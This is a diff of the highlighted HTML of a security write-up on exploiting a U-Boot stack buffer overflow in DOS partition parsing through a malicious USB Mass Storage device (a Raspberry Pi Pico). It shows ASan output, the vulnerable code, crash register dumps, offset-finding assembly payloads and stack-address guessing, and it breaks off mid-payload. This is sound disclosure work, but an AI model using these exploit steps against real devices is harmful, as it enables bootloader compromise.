+<span class="n">Address</span><span class="w"> </span><span class="mh">0x7ffe6db4bb3f</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">located</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">stack</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="kr">thread</span><span class="w"> </span><span class="n">T0</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="mi">607</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">frame</span>
+<span class="w">    </span><span class="cp">#0 0x5282ff in part_test_dos /u-boot-elaine/disk/part_dos.c:90</span>
 
-  <span class="n">This</span> <span class="n">frame</span> <span class="n">has</span> <span class="mi">1</span> <span class="n">object</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">:</span>
-    <span class="p">[</span><span class="mi">32</span><span class="p">,</span> <span class="mi">607</span><span class="p">)</span> <span class="err">&#39;</span><span class="n">__mbr</span><span class="err">&#39;</span> <span class="p">(</span><span class="n">line</span> <span class="mi">92</span><span class="p">)</span> <span class="o">&lt;==</span> <span class="n">Memory</span> <span class="n">access</span> <span class="n">at</span> <span class="n">offset</span> <span class="mi">607</span> <span class="n">overflows</span> <span class="n">this</span> <span class="n">variable</span>
-</pre></div>
-
+<span class="w">  </span><span class="n">This</span><span class="w"> </span><span class="n">frame</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">object</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">:</span>
+<span class="w">    </span><span class="p">[</span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="mi">607</span><span class="p">)</span><span class="w"> </span><span class="err">&#39;</span><span class="n">__mbr</span><span class="err">&#39;</span><span class="w"> </span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="mi">92</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;==</span><span class="w"> </span><span class="n">Memory</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="mi">607</span><span class="w"> </span><span class="n">overflows</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">variable</span>
+</code></pre></div>
 
 <p>AddressSanitizer detected a stack buffer overflow in <strong>part_test_dos</strong>. This function is called to detect a DOS partition table when an USB Mass Storage device is connected.</p>
 <p>It is interesting to note that, while the crash occurs in DOS partition layer, the invalid size at the origin of the crash is set by the USB Mass Storage layer. This suggests that it is unlikely to find this bug if layers are fuzzed independently.</p>
 <h2>U-Boot stack overflow</h2>
 <p>The crash is caused by a simple bug in function <strong>part_test_dos</strong> :</p>
-<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kt">int</span> <span class="nf">part_test_dos</span><span class="p">(</span><span class="k">struct</span> <span class="n">blk_desc</span> <span class="o">*</span><span class="n">dev_desc</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">part_test_dos</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">blk_desc</span><span class="w"> </span><span class="o">*</span><span class="n">dev_desc</span><span class="p">)</span>
 <span class="p">{</span>
 <span class="p">[...]</span>
-<span class="p">(</span><span class="mi">1</span><span class="p">)</span>    <span class="n">ALLOC_CACHE_ALIGN_BUFFER</span><span class="p">(</span><span class="n">legacy_mbr</span><span class="p">,</span> <span class="n">mbr</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w">    </span><span class="n">ALLOC_CACHE_ALIGN_BUFFER</span><span class="p">(</span><span class="n">legacy_mbr</span><span class="p">,</span><span class="w"> </span><span class="n">mbr</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
 
-<span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="k">if</span> <span class="p">(</span><span class="n">blk_dread</span><span class="p">(</span><span class="n">dev_desc</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)</span><span class="n">mbr</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>
-</pre></div>
-
+<span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">blk_dread</span><span class="p">(</span><span class="n">dev_desc</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">ulong</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">mbr</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div>
 
 <ol>
 <li>Buffer <em>mbr</em> of 512 bytes (<strong>sizeof</strong>(<em>legacy_mbr</em>)) is allocated on the stack.</li>
@@ -374,88 +428,84 @@ This first fuzzing attempt uncovered few <a href="https://en.wikipedia.org/wiki/
 <h2>3.1 Proof-of-Crash</h2>
 <p>We start by verifying if the device is actually vulnerable to the bug. Using the <a href="https://github.com/hathach/tinyusb/tree/4bfab30c02279a0530e1a56f4a7c539f2d35a293/examples/device/cdc_msc">Mass Storage device example code</a> as starting point, we <a href="https://github.com/frederic/chipicopwn/commit/c576f382b6ada027aab592ede525db1405f79cf4">change the block size to 1024 instead of 512</a> to confirm if we observe a crash.</p>
 <p>When connected to our host, the Raspberry Pi Pico is now detected as Mass Storage with <em>"1024-byte logical blocks"</em> :</p>
-<div class="highlight"><pre><span></span>usb <span class="m">1</span>-2: New USB device found, <span class="nv">idVendor</span><span class="o">=</span>cafe, <span class="nv">idProduct</span><span class="o">=</span><span class="m">4003</span>, <span class="nv">bcdDevice</span><span class="o">=</span> <span class="m">1</span>.00
-usb <span class="m">1</span>-2: New USB device strings: <span class="nv">Mfr</span><span class="o">=</span><span class="m">1</span>, <span class="nv">Product</span><span class="o">=</span><span class="m">2</span>, <span class="nv">SerialNumber</span><span class="o">=</span><span class="m">3</span>
-usb <span class="m">1</span>-2: Product: TinyUSB Device
-usb <span class="m">1</span>-2: Manufacturer: TinyUSB
-usb <span class="m">1</span>-2: SerialNumber: <span class="m">123456789012</span>
-usb-storage <span class="m">1</span>-2:1.0: USB Mass Storage device detected
-scsi host0: usb-storage <span class="m">1</span>-2:1.0
-scsi host0: scsi scan: INQUIRY result too short <span class="o">(</span><span class="m">5</span><span class="o">)</span>, using <span class="m">36</span>
-scsi <span class="m">0</span>:0:0:0: Direct-Access     TinyUSB  Mass Storage     <span class="m">1</span>.0  PQ: <span class="m">0</span> ANSI: <span class="m">2</span>
-sd <span class="m">0</span>:0:0:0: Attached scsi generic sg0 <span class="nb">type</span> <span class="m">0</span>
-sd <span class="m">0</span>:0:0:0: <span class="o">[</span>sda<span class="o">]</span> <span class="m">16</span> <span class="m">1024</span>-byte logical blocks: <span class="o">(</span><span class="m">16</span>.4 kB/16.0 KiB<span class="o">)</span>
-sd <span class="m">0</span>:0:0:0: <span class="o">[</span>sda<span class="o">]</span> Write Protect is off
-sd <span class="m">0</span>:0:0:0: <span class="o">[</span>sda<span class="o">]</span> Mode Sense: <span class="m">03</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>
-sd <span class="m">0</span>:0:0:0: <span class="o">[</span>sda<span class="o">]</span> No Caching mode page found
-sd <span class="m">0</span>:0:0:0: <span class="o">[</span>sda<span class="o">]</span> Assuming drive cache: write through
- sda:
-sd <span class="m">0</span>:0:0:0: <span class="o">[</span>sda<span class="o">]</span> Attached SCSI removable disk
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>usb<span class="w"> </span><span class="m">1</span>-2:<span class="w"> </span>New<span class="w"> </span>USB<span class="w"> </span>device<span class="w"> </span>found,<span class="w"> </span><span class="nv">idVendor</span><span class="o">=</span>cafe,<span class="w"> </span><span class="nv">idProduct</span><span class="o">=</span><span class="m">4003</span>,<span class="w"> </span><span class="nv">bcdDevice</span><span class="o">=</span><span class="w"> </span><span class="m">1</span>.00
+usb<span class="w"> </span><span class="m">1</span>-2:<span class="w"> </span>New<span class="w"> </span>USB<span class="w"> </span>device<span class="w"> </span>strings:<span class="w"> </span><span class="nv">Mfr</span><span class="o">=</span><span class="m">1</span>,<span class="w"> </span><span class="nv">Product</span><span class="o">=</span><span class="m">2</span>,<span class="w"> </span><span class="nv">SerialNumber</span><span class="o">=</span><span class="m">3</span>
+usb<span class="w"> </span><span class="m">1</span>-2:<span class="w"> </span>Product:<span class="w"> </span>TinyUSB<span class="w"> </span>Device
+usb<span class="w"> </span><span class="m">1</span>-2:<span class="w"> </span>Manufacturer:<span class="w"> </span>TinyUSB
+usb<span class="w"> </span><span class="m">1</span>-2:<span class="w"> </span>SerialNumber:<span class="w"> </span><span class="m">123456789012</span>
+usb-storage<span class="w"> </span><span class="m">1</span>-2:1.0:<span class="w"> </span>USB<span class="w"> </span>Mass<span class="w"> </span>Storage<span class="w"> </span>device<span class="w"> </span>detected
+scsi<span class="w"> </span>host0:<span class="w"> </span>usb-storage<span class="w"> </span><span class="m">1</span>-2:1.0
+scsi<span class="w"> </span>host0:<span class="w"> </span>scsi<span class="w"> </span>scan:<span class="w"> </span>INQUIRY<span class="w"> </span>result<span class="w"> </span>too<span class="w"> </span>short<span class="w"> </span><span class="o">(</span><span class="m">5</span><span class="o">)</span>,<span class="w"> </span>using<span class="w"> </span><span class="m">36</span>
+scsi<span class="w"> </span><span class="m">0</span>:0:0:0:<span class="w"> </span>Direct-Access<span class="w">     </span>TinyUSB<span class="w">  </span>Mass<span class="w"> </span>Storage<span class="w">     </span><span class="m">1</span>.0<span class="w">  </span>PQ:<span class="w"> </span><span class="m">0</span><span class="w"> </span>ANSI:<span class="w"> </span><span class="m">2</span>
+sd<span class="w"> </span><span class="m">0</span>:0:0:0:<span class="w"> </span>Attached<span class="w"> </span>scsi<span class="w"> </span>generic<span class="w"> </span>sg0<span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="m">0</span>
+sd<span class="w"> </span><span class="m">0</span>:0:0:0:<span class="w"> </span><span class="o">[</span>sda<span class="o">]</span><span class="w"> </span><span class="m">16</span><span class="w"> </span><span class="m">1024</span>-byte<span class="w"> </span>logical<span class="w"> </span>blocks:<span class="w"> </span><span class="o">(</span><span class="m">16</span>.4<span class="w"> </span>kB/16.0<span class="w"> </span>KiB<span class="o">)</span>
+sd<span class="w"> </span><span class="m">0</span>:0:0:0:<span class="w"> </span><span class="o">[</span>sda<span class="o">]</span><span class="w"> </span>Write<span class="w"> </span>Protect<span class="w"> </span>is<span class="w"> </span>off
+sd<span class="w"> </span><span class="m">0</span>:0:0:0:<span class="w"> </span><span class="o">[</span>sda<span class="o">]</span><span class="w"> </span>Mode<span class="w"> </span>Sense:<span class="w"> </span><span class="m">03</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span>
+sd<span class="w"> </span><span class="m">0</span>:0:0:0:<span class="w"> </span><span class="o">[</span>sda<span class="o">]</span><span class="w"> </span>No<span class="w"> </span>Caching<span class="w"> </span>mode<span class="w"> </span>page<span class="w"> </span>found
+sd<span class="w"> </span><span class="m">0</span>:0:0:0:<span class="w"> </span><span class="o">[</span>sda<span class="o">]</span><span class="w"> </span>Assuming<span class="w"> </span>drive<span class="w"> </span>cache:<span class="w"> </span>write<span class="w"> </span>through
+<span class="w"> </span>sda:
+sd<span class="w"> </span><span class="m">0</span>:0:0:0:<span class="w"> </span><span class="o">[</span>sda<span class="o">]</span><span class="w"> </span>Attached<span class="w"> </span>SCSI<span class="w"> </span>removable<span class="w"> </span>disk
+</code></pre></div>
 
 <p>When connected to the device booted in recovery mode, the Pico causes an exception, and registers are dumped over UART :</p>
-<div class="highlight"><pre><span></span><span class="s">&quot;Synchronous Abort&quot;</span> <span class="n">handler</span><span class="p">,</span> <span class="n">esr</span> <span class="mh">0x02000000</span>
-<span class="nl">elr</span><span class="p">:</span> <span class="n">ffffffff8110e000</span> <span class="nl">lr</span> <span class="p">:</span> <span class="n">ffffffff8110e000</span> <span class="p">(</span><span class="n">reloc</span><span class="p">)</span>
-<span class="nl">elr</span><span class="p">:</span> <span class="mo">0000000000000000</span> <span class="nl">lr</span> <span class="p">:</span> <span class="mo">0000000000000000</span>
-<span class="nl">x0</span> <span class="p">:</span> <span class="mo">0000000000000002</span> <span class="nl">x1</span> <span class="p">:</span> <span class="mo">0000000000000000</span>
-<span class="nl">x2</span> <span class="p">:</span> <span class="mo">0000000000000000</span> <span class="nl">x3</span> <span class="p">:</span> <span class="mo">0000000000000000</span>
-<span class="nl">x4</span> <span class="p">:</span> <span class="mo">000000007</span><span class="n">bed5b00</span> <span class="nl">x5</span> <span class="p">:</span> <span class="n">fffffffffffffff8</span>
-<span class="nl">x6</span> <span class="p">:</span> <span class="mo">0000000000000000</span> <span class="nl">x7</span> <span class="p">:</span> <span class="mo">0000000000000000</span>
-<span class="nl">x8</span> <span class="p">:</span> <span class="mo">0000000000000001</span> <span class="nl">x9</span> <span class="p">:</span> <span class="mo">000000000000000</span><span class="mi">8</span>
-<span class="nl">x10</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">c0021b0</span> <span class="nl">x11</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">c009b80</span>
-<span class="nl">x12</span><span class="p">:</span> <span class="mo">0000000000000001</span> <span class="nl">x13</span><span class="p">:</span> <span class="mo">0000000000000001</span>
-<span class="nl">x14</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">bed5c4c</span> <span class="nl">x15</span><span class="p">:</span> <span class="mf">00000000ff</span><span class="n">ffffff</span>
-<span class="nl">x16</span><span class="p">:</span> <span class="mo">0000000000004060</span> <span class="nl">x17</span><span class="p">:</span> <span class="mo">00000000000000</span><span class="mi">84</span>
-<span class="nl">x18</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">bee1dc8</span> <span class="nl">x19</span><span class="p">:</span> <span class="mo">0000000000000000</span>
-<span class="nl">x20</span><span class="p">:</span> <span class="mo">0000000000000000</span> <span class="nl">x21</span><span class="p">:</span> <span class="mo">0000000000000000</span>
-<span class="nl">x22</span><span class="p">:</span> <span class="mo">000000000000002</span><span class="n">a</span> <span class="nl">x23</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">c008490</span>
-<span class="nl">x24</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">c008490</span> <span class="nl">x25</span><span class="p">:</span> <span class="mf">000000007ff</span><span class="n">dcd80</span>
-<span class="nl">x26</span><span class="p">:</span> <span class="mo">0000000000000000</span> <span class="nl">x27</span><span class="p">:</span> <span class="mo">0000000000000000</span>
-<span class="nl">x28</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">c009ac0</span> <span class="nl">x29</span><span class="p">:</span> <span class="mo">0000000000000000</span>
+<div class="highlight"><pre><span></span><code><span class="s">&quot;Synchronous Abort&quot;</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="n">esr</span><span class="w"> </span><span class="mh">0x02000000</span>
+<span class="nl">elr</span><span class="p">:</span><span class="w"> </span><span class="n">ffffffff8110e000</span><span class="w"> </span><span class="n">lr</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">ffffffff8110e000</span><span class="w"> </span><span class="p">(</span><span class="n">reloc</span><span class="p">)</span>
+<span class="nl">elr</span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000000000</span><span class="w"> </span><span class="n">lr</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000000</span>
+<span class="nl">x0</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000000002</span><span class="w"> </span><span class="n">x1</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000000</span>
+<span class="nl">x2</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000000000</span><span class="w"> </span><span class="n">x3</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000000</span>
+<span class="nl">x4</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">bed5b00</span><span class="w"> </span><span class="n">x5</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">fffffffffffffff8</span>
+<span class="nl">x6</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000000000</span><span class="w"> </span><span class="n">x7</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000000</span>
+<span class="nl">x8</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000000001</span><span class="w"> </span><span class="n">x9</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mo">000000000000000</span><span class="mi">8</span>
+<span class="nl">x10</span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">c0021b0</span><span class="w"> </span><span class="n">x11</span><span class="o">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">c009b80</span>
+<span class="nl">x12</span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000000001</span><span class="w"> </span><span class="n">x13</span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000001</span>
+<span class="nl">x14</span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">bed5c4c</span><span class="w"> </span><span class="n">x15</span><span class="o">:</span><span class="w"> </span><span class="mf">00000000f</span><span class="n">fffffff</span>
+<span class="nl">x16</span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000004060</span><span class="w"> </span><span class="n">x17</span><span class="o">:</span><span class="w"> </span><span class="mo">00000000000000</span><span class="mi">84</span>
+<span class="nl">x18</span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">bee1dc8</span><span class="w"> </span><span class="n">x19</span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000000</span>
+<span class="nl">x20</span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000000000</span><span class="w"> </span><span class="n">x21</span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000000</span>
+<span class="nl">x22</span><span class="p">:</span><span class="w"> </span><span class="mo">000000000000002</span><span class="n">a</span><span class="w"> </span><span class="n">x23</span><span class="o">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">c008490</span>
+<span class="nl">x24</span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">c008490</span><span class="w"> </span><span class="n">x25</span><span class="o">:</span><span class="w"> </span><span class="mf">000000007f</span><span class="n">fdcd80</span>
+<span class="nl">x26</span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000000000</span><span class="w"> </span><span class="n">x27</span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000000</span>
+<span class="nl">x28</span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">c009ac0</span><span class="w"> </span><span class="n">x29</span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000000</span>
 
-<span class="n">Resetting</span> <span class="n">CPU</span> <span class="p">...</span>
-</pre></div>
-
+<span class="n">Resetting</span><span class="w"> </span><span class="n">CPU</span><span class="w"> </span><span class="p">...</span>
+</code></pre></div>
 
 <p>This indicates with great certainty that the device is vulnerable to our bug. Register values will be very helpful to develop the exploit. Unfortunately, <em>sp</em> register value is missing, so we'll have to do extra work to locate our payload in the stack. Still, we have obtained the global data pointer <em>gd</em> which is <a href="https://u-boot.readthedocs.io/en/latest/develop/global_data.html">stored in register <em>x18</em></a>. And we can learn from U-Boot source code that stack top is located below <em>gd</em>.</p>
 <h2>3.2 Offset of payload address</h2>
 <p>The bug allows to overflow a buffer on the stack to overwrite a return address. First, we look for the offset in our payload that will overwrite that return address. For that, we create a <a href="https://github.com/frederic/chipicopwn/blob/main/payloads/poc_step1.S">payload filled with incremental invalid pointers</a> :</p>
-<div class="highlight"><pre><span></span><span class="na">.text</span>
-<span class="na">.global</span> <span class="no">_start</span>
+<div class="highlight"><pre><span></span><code><span class="na">.text</span>
+<span class="na">.global</span><span class="w"> </span><span class="no">_start</span>
 
 <span class="nl">_start:</span>
-<span class="na">.word</span> <span class="mi">0xFFFFFC00</span>
-<span class="na">.word</span> <span class="mi">0xFFFFFC01</span>
-<span class="na">.word</span> <span class="mi">0xFFFFFC02</span>
+<span class="na">.word</span><span class="w"> </span><span class="mi">0xFFFFFC00</span>
+<span class="na">.word</span><span class="w"> </span><span class="mi">0xFFFFFC01</span>
+<span class="na">.word</span><span class="w"> </span><span class="mi">0xFFFFFC02</span>
 <span class="err">[</span><span class="na">...</span><span class="p">]</span>
-<span class="na">.word</span> <span class="mi">0xFFFFFFFF</span>
-</pre></div>
-
+<span class="na">.word</span><span class="w"> </span><span class="mi">0xFFFFFFFF</span>
+</code></pre></div>
 
 <p>Then, we <a href="https://github.com/frederic/chipicopwn/commit/42ced2f16d4c7f64f74d6d6d13e93d85a72c8ba7">modify the Pico code</a> to use this payload as the block 0 of the block device. The device crashes again :</p>
-<div class="highlight"><pre><span></span><span class="s">&quot;Synchronous Abort&quot;</span> <span class="n">handler</span><span class="p">,</span> <span class="n">esr</span> <span class="mh">0x8a000000</span>
-<span class="nl">elr</span><span class="p">:</span> <span class="n">fffffc8f8110dc8e</span> <span class="nl">lr</span> <span class="p">:</span> <span class="n">fffffc8f8110dc8e</span> <span class="p">(</span><span class="n">reloc</span><span class="p">)</span>
-<span class="nl">elr</span><span class="p">:</span> <span class="n">fffffc8ffffffc8e</span> <span class="nl">lr</span> <span class="p">:</span> <span class="n">fffffc8ffffffc8e</span>
-<span class="nl">x0</span> <span class="p">:</span> <span class="mf">00000000ff</span><span class="n">ffffff</span> <span class="nl">x1</span> <span class="p">:</span> <span class="mo">0000000000000001</span>
-<span class="nl">x2</span> <span class="p">:</span> <span class="mo">000000007</span><span class="n">bed5888</span> <span class="nl">x3</span> <span class="p">:</span> <span class="mo">0000000000000000</span>
-<span class="nl">x4</span> <span class="p">:</span> <span class="mo">0000000000001000</span> <span class="nl">x5</span> <span class="p">:</span> <span class="mo">0000000000000200</span>
-<span class="nl">x6</span> <span class="p">:</span> <span class="n">fffffffffffffffe</span> <span class="nl">x7</span> <span class="p">:</span> <span class="mo">0000000000000000</span>
-<span class="nl">x8</span> <span class="p">:</span> <span class="mo">0000000000000001</span> <span class="nl">x9</span> <span class="p">:</span> <span class="mo">000000000000000</span><span class="mi">8</span>
-<span class="nl">x10</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">c0021b0</span> <span class="nl">x11</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">c009b80</span>
-<span class="nl">x12</span><span class="p">:</span> <span class="mo">0000000000000001</span> <span class="nl">x13</span><span class="p">:</span> <span class="mo">0000000000000001</span>
-<span class="nl">x14</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">bed5c4c</span> <span class="nl">x15</span><span class="p">:</span> <span class="mf">00000000ff</span><span class="n">ffffff</span>
-<span class="nl">x16</span><span class="p">:</span> <span class="mo">0000000000004060</span> <span class="nl">x17</span><span class="p">:</span> <span class="mo">00000000000000</span><span class="mi">84</span>
-<span class="nl">x18</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">bee1dc8</span> <span class="nl">x19</span><span class="p">:</span> <span class="n">fffffc91fffffc90</span>
-<span class="nl">x20</span><span class="p">:</span> <span class="n">fffffc93fffffc92</span> <span class="nl">x21</span><span class="p">:</span> <span class="n">fffffc95fffffc94</span>
-<span class="nl">x22</span><span class="p">:</span> <span class="mo">000000000000002</span><span class="n">a</span> <span class="nl">x23</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">c008490</span>
-<span class="nl">x24</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">c008490</span> <span class="nl">x25</span><span class="p">:</span> <span class="mf">000000007ff</span><span class="n">dcd80</span>
-<span class="nl">x26</span><span class="p">:</span> <span class="mo">0000000000000000</span> <span class="nl">x27</span><span class="p">:</span> <span class="mo">0000000000000000</span>
-<span class="nl">x28</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">c009ac0</span> <span class="nl">x29</span><span class="p">:</span> <span class="n">fffffc8dfffffc8c</span>
+<div class="highlight"><pre><span></span><code><span class="s">&quot;Synchronous Abort&quot;</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="n">esr</span><span class="w"> </span><span class="mh">0x8a000000</span>
+<span class="nl">elr</span><span class="p">:</span><span class="w"> </span><span class="n">fffffc8f8110dc8e</span><span class="w"> </span><span class="n">lr</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">fffffc8f8110dc8e</span><span class="w"> </span><span class="p">(</span><span class="n">reloc</span><span class="p">)</span>
+<span class="nl">elr</span><span class="p">:</span><span class="w"> </span><span class="n">fffffc8ffffffc8e</span><span class="w"> </span><span class="n">lr</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">fffffc8ffffffc8e</span>
+<span class="nl">x0</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mf">00000000f</span><span class="n">fffffff</span><span class="w"> </span><span class="n">x1</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000001</span>
+<span class="nl">x2</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">bed5888</span><span class="w"> </span><span class="n">x3</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000000</span>
+<span class="nl">x4</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000001000</span><span class="w"> </span><span class="n">x5</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000200</span>
+<span class="nl">x6</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">fffffffffffffffe</span><span class="w"> </span><span class="n">x7</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000000</span>
+<span class="nl">x8</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000000001</span><span class="w"> </span><span class="n">x9</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mo">000000000000000</span><span class="mi">8</span>
+<span class="nl">x10</span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">c0021b0</span><span class="w"> </span><span class="n">x11</span><span class="o">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">c009b80</span>
+<span class="nl">x12</span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000000001</span><span class="w"> </span><span class="n">x13</span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000001</span>
+<span class="nl">x14</span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">bed5c4c</span><span class="w"> </span><span class="n">x15</span><span class="o">:</span><span class="w"> </span><span class="mf">00000000f</span><span class="n">fffffff</span>
+<span class="nl">x16</span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000004060</span><span class="w"> </span><span class="n">x17</span><span class="o">:</span><span class="w"> </span><span class="mo">00000000000000</span><span class="mi">84</span>
+<span class="nl">x18</span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">bee1dc8</span><span class="w"> </span><span class="n">x19</span><span class="o">:</span><span class="w"> </span><span class="n">fffffc91fffffc90</span>
+<span class="nl">x20</span><span class="p">:</span><span class="w"> </span><span class="n">fffffc93fffffc92</span><span class="w"> </span><span class="n">x21</span><span class="o">:</span><span class="w"> </span><span class="n">fffffc95fffffc94</span>
+<span class="nl">x22</span><span class="p">:</span><span class="w"> </span><span class="mo">000000000000002</span><span class="n">a</span><span class="w"> </span><span class="n">x23</span><span class="o">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">c008490</span>
+<span class="nl">x24</span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">c008490</span><span class="w"> </span><span class="n">x25</span><span class="o">:</span><span class="w"> </span><span class="mf">000000007f</span><span class="n">fdcd80</span>
+<span class="nl">x26</span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000000000</span><span class="w"> </span><span class="n">x27</span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000000</span>
+<span class="nl">x28</span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">c009ac0</span><span class="w"> </span><span class="n">x29</span><span class="o">:</span><span class="w"> </span><span class="n">fffffc8dfffffc8c</span>
 
-<span class="n">Resetting</span> <span class="n">CPU</span> <span class="p">...</span>
-</pre></div>
-
+<span class="n">Resetting</span><span class="w"> </span><span class="n">CPU</span><span class="w"> </span><span class="p">...</span>
+</code></pre></div>
 
 <p>We can notice that the link register <em>lr</em> contains an invalid pointer : fffffc8ffffffc8e. We recognize values 0xFFFFFC8E and 0xFFFFFC8F from our payload. This means the offset is 0x238 (0x8e * 4 bytes).</p>
 <h2>3.3 Payload address</h2>
@@ -464,51 +514,49 @@ sd <span class="m">0</span>:0:0:0: <span class="o">[</span>sda<span class="o">]<
 <p>If we manage to guess the address of any of these 8,185 branch instructions, the payload will be executed.
 And we have a major hint : we already know that stack top is located below <em>gd</em> address (register <em>x18</em>).</p>
 <p>One educated guess is : (gd - 0x8000) = (0x7bee1dc8 - 0x8000) = <strong>0x7BED9DC8</strong>.</p>
-<div class="highlight"><pre><span></span><span class="na">.text</span>
-<span class="na">.global</span> <span class="no">_start</span>
+<div class="highlight"><pre><span></span><code><span class="na">.text</span>
+<span class="na">.global</span><span class="w"> </span><span class="no">_start</span>
 
 <span class="nl">_start:</span>
-    <span class="nf">b</span> <span class="no">_payload</span>
